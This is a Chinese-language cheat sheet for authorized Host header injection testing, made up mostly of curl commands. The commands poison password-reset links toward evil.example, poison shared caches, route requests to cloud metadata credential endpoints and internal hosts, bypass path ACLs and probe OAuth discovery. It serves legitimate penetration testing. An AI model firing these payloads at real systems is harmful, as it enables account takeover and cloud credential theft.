# Host 头注入参考（授权测试）

适用前提：目标在授权范围内；密码重置只用自己的测试账号；注入域名只用自己的域名或
Burp Collaborator / interactsh。

## 1. 输入面

优先找这些入口：

- 密码重置 / 忘记密码 / 邮箱验证 / 邀请 / 分享 / webhook 配置
- 任何返回绝对 URL 的接口（`set-password`、分享链接、下载链接、canonical、og:url）
- 反向代理 / CDN 后面的站点（Cloudflare、Akamai、Fastly、Varnish、Nginx、HAProxy、k8s ingress）
- OAuth/OIDC authorize 与 `/.well-known/openid-configuration`
- 邮件发送、通知、导出任务

候选头（按可信度从高到低试探）：

```
Host
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
X-Original-URL      (路径覆盖类，不是 host 类)
X-Rewrite-URL       (路径覆盖类)
X-Override-URL      (路径覆盖类)
X-Forwarded-Scheme
```

## 2. 密码重置投毒

只对自己账号发请求，然后**去自己的邮箱看链接 host**——HTTP 响应里反射了 Host 不算数。

```bash
# 2.1 直接改 Host
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: evil.example" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.example"}'

# 2.2 反代信任 X-Forwarded-Host
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.example" \
  -d "email=your-test-account@target.example"

# 2.3 X-Host
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: $TARGET" -H "X-Host: evil.example" \
  -d "email=your-test-account@target.example"

# 2.4 双 Host（有的栈读第二个 Host）
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.example' "$TARGET" \
  | openssl s_client -quiet -connect "$TARGET:443" 2>/dev/null

# 2.5 后缀拼接：真实 host 保留，链接变成 https://TARGET.evil.example/...
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: $TARGET.evil.example" -d "email=your-test-account@target.example"

# 2.6 端口 / userinfo 混淆
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Host: $TARGET:1@evil.example" -d "email=your-test-account@target.example"
```

成立证据（任一）：

1. 测试邮箱里的链接 host 是 `evil.example` / `$TARGET.evil.example` / Collaborator；
2. 用 Collaborator 域名做注入 host，点击/预览链接时 Collaborator 收到带 token 的请求。

注意：很多邮件模板使用固定 `SITE_URL`，Host 反射到 HTTP 响应不代表邮件被投毒。

## 3. 缓存投毒

机制是**反射 + 可缓存 + 注入头不在 cache key 里**，不是 OOB。必须证明“干净请求也中毒”。

```bash
# 3.1 是否反射进响应体
curl -s "https://$TARGET/" -H "Host: $TARGET" \
  -H "X-Forwarded-Host: canary-$RANDOM.evil.example" | grep -i canary

# 3.2 是否可缓存、Vary 是否覆盖该头
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"

# 3.3 投毒一次，再用不带头的干净请求取同一个 key
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null
curl -s "$URL" | grep -i evilcdn.example    # 干净请求仍命中 = 共享缓存投毒
```

假阳性排除：

- 只有自己的请求能看到反射（头在 `Vary` 里 / CDN 把 Host 算进 key）→ 不是投毒。
- 每次都 `MISS` / `Age: 0` → 无共享缓存，降为 self-only / Low。
- 换出口 IP / 无痕窗口 / 第二台机器再验一次，确认 blast radius。

## 4. SSRF：两种机制，不要混用

### 4.1 路由型 SSRF

Host 决定反代把请求转给哪个上游；路径必须放在 request line 上。元数据服务只认 request
line + 转发的头，`X-Original-URL` 在这里无效。

```bash
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"

# Azure
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# 内网主机/端口
curl -s "https://$TARGET/" -H "Host: localhost:6379"
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# 盲打：看 Collaborator 的 DNS/HTTP 回连
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

### 4.2 路径覆盖 / ACL 绕过

IIS/ASP.NET、Spring Cloud Gateway 等会读 `X-Original-URL` / `X-Rewrite-URL` 改写路由路径。
真实 Host 保持不变，绕的是边缘路径 ACL，不是选上游。

```bash
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
```

判据：与直连 `/admin`（被边缘 403/404）相比，status/body 不同，且响应来自内部应用。

## 5. OAuth / OIDC / SAML 反射

```bash
# authorize 是否用 Host 构造 redirect_uri / 展示 URL
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.example" | grep -iE "redirect|location|action="

# discovery 的 issuer / 端点是否反射 Host
curl -s "https://$TARGET/.well-known/openid-configuration" \
  -H "X-Forwarded-Host: evil.example" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

判据：授权码/token 实际投递到攻击者域名（Collaborator 收到），仅仅反射字符串不算。

## 6. 头爆破

Burp Param Miner → Guess headers 比手写清单快。手工扫时一次只换一个头，记录响应差异：

```bash
HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.evil.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

## 7. 组合链

| 发现 | 可组合到 | 影响 |
|------|----------|------|
| 重置链接 host 可控（自己账号） | Collaborator 收 token → 点击即 ATO | Critical |
| X-Forwarded-Host 反射 + 可缓存 + 未 keyed | 投毒后干净请求命中 → 挂 XSS/跳转 | High（mass） |
| 前端按 Host 路由 | 元数据服务 → 云凭据 | High/Critical |
| X-Original-URL 覆盖路径 | 访问边缘禁止的 /admin | High |
| OAuth issuer/redirect_uri 由 Host 构造 | 授权码投递到攻击者域 | Critical |

## 8. 判真与降级

- 反射 ≠ 缓存；只对自己缓存 ≠ 对他人缓存（看 `Vary`、换 IP）。
- 200 回显 Host 字符串 ≠ SSRF；必须看到内部响应内容或 Collaborator 回连。
- 邮件链接固定 → 不要报“重置投毒”；改报缓存/OAuth 子类或降级。
- 只影响自己账号、无共享缓存、无内网到达 → Low / informational。

严重度参考：

- 重置 → 任意用户 ATO：Critical
- 路由 SSRF → 云元数据凭据：Critical（凭据可用）/ High
- 缓存投毒 → 大规模 XSS/跳转（共享 key 已证）：High
- 路径覆盖 → 内部/管理面可达：High
- 仅反射、不可缓存、未进邮件、无内网：Low / informational

## 9. 证据清单

- 注入头、完整 URL、时间、测试账号
- 原始请求/响应（或 Collaborator 交互记录）
- 影响证明：邮件链接 host、干净请求投毒响应、内网响应体、边缘差异
- 明确写出未成立的分支与降级理由
